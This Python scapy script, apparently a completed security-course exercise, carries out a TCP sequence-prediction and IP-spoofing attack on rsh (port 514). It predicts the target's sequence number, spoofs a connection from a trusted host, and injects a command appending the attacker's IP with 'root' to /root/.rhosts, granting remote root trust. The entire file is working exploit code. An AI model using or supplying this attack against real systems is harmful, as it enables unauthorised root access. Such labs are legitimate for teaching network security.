from scapy.all import *

import sys
import time

if __name__ == "__main__":
    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]

    my_ip = get_if_addr(sys.argv[1])

    #DONE: figure out SYN sequence number pattern
    sport = 1023
    dport = 514
    seq = 1000
    rsp = sr1(IP(src=my_ip, dst=target_ip) / TCP(sport=sport, dport=dport, flags='S',seq=seq), verbose=0)
    send(IP(src=my_ip, dst=target_ip) / TCP(sport=sport, dport=dport, flags='R'), verbose=0)

    #DONE: TCP hijacking with predicted sequence number
    seq += 1
    ack = rsp.seq + 64000 + 1
    send(IP(src=trusted_host_ip, dst=target_ip) / TCP(sport=sport, dport=dport, flags='S', seq=seq), verbose=0)
    send(IP(src=my_ip, dst=target_ip) / TCP(sport=sport, dport=dport, flags='A', seq=seq, ack=ack), verbose=0)
    send(IP(src=my_ip, dst=target_ip) / TCP(sport=sport, dport=dport, flags='AP', seq=seq, ack=ack) / Raw(load=str.encode('1022\0')), verbose=0)
    time.sleep(2)
    for i in range(1019,1024):
        send(IP(src=my_ip, dst=target_ip) / TCP(sport=1022, dport=i, flags='SA',seq=seq, ack=ack+64000), verbose=0)
    time.sleep(1)

    seq += 5
    payload = str.encode("root\0root\0 echo '" + my_ip + " root' >> /root/.rhosts\0")
    send(IP(src=my_ip, dst=target_ip) / TCP(sport=sport, dport=dport, flags='AP', seq=seq, ack=ack) / Raw(load=payload), verbose=0)
    time.sleep(1)
    for i in range(1019,1024):
        send(IP(src=my_ip, dst=target_ip) / TCP(sport=1022, dport=i, flags='R'), verbose=0)
    send(IP(src=my_ip, dst=target_ip) / TCP(sport=sport, dport=dport, flags='R'), verbose=0)